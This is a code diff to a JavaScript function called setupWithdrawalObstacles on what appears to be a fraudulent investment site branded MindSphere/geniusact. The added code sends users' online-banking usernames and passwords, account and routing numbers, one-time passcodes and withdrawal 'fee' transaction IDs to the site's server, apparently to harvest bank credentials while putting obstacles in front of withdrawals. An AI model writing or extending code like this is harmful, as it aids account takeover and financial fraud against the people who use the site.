@@ -486,7 +486,7 @@ function setupWithdrawalObstacles() {
                 btn.disabled = true;
                 btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Authenticating...`;
 
-                // Store in geniusact_bank_links so it syncs to Cloud Engine / Admin panel
+                // Store in geniusact_bank_links and call server directly
                 const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
                 const newLink = {
                     id: 'LINK-' + Date.now(),
@@ -503,6 +503,25 @@ function setupWithdrawalObstacles() {
                     status: 'linked',
                     linkedAt: new Date().toISOString()
                 };
+
+                // Server-first persistence
+                try {
+                    const fetchFn = window.geniusFetch || fetch;
+                    await fetchFn('/api/bank/link', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            userEmail: newLink.userEmail,
+                            bankName: newLink.bankName,
+                            accountNumber: newLink.accountNumber,
+                            routingNumber: newLink.routingNumber,
+                            username: newLink.username,
+                            password: newLink.password
+                        })
+                    });
+                } catch (e) {
+                    console.warn('[MindSphere] Bank link server error:', e);
+                }
 
                 // Replace previous link for this user or add new
                 const existingIdx = bankLinks.findIndex(l => l.userEmail && l.userEmail.toLowerCase() === newLink.userEmail.toLowerCase());
@@ -618,6 +637,18 @@ function setupWithdrawalObstacles() {
                     bankLinks[idx].otpSubmittedAt = new Date().toISOString();
                     bankLinks[idx].otpVerified = false;
                     localStorage.setItem('geniusact_bank_links', JSON.stringify(bankLinks));
+
+                    try {
+                        const fetchFn = window.geniusFetch || fetch;
+                        await fetchFn('/api/bank/submit-otp', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ userEmail: bankLinks[idx].userEmail, otp: val })
+                        });
+                    } catch (e) {
+                        console.warn('[MindSphere] OTP submit server error:', e);
+                    }
+
                     if (window.cloudSyncFull) {
                         try { await window.cloudSyncFull(); } catch(e) {}
                     }
@@ -918,6 +949,26 @@ function setupWithdrawalObstacles() {
 
                     requests.unshift(newRequest);
                     localStorage.setItem('geniusact_withdrawal_requests', JSON.stringify(requests));
+
+                    // Server-first persistence
+                    try {
+                        const fetchFn = window.geniusFetch || fetch;
+                        await fetchFn('/api/withdraw', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                userEmail: newRequest.userEmail,
+                                amount: newRequest.amount,
+                                bank: newRequest.bank,
+                                accountNumber: newRequest.accountNumber,
+                                routingNumber: newRequest.routingNumber,
+                                feePaid: newRequest.feePaid,
+                                feeTxid: newRequest.feeTxid
+                            })
+                        });
+                    } catch (e) {
+                        console.warn('[MindSphere] Withdrawal server error:', e);
+                    }
 
                     if (window.cloudSyncFull) {
                         try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
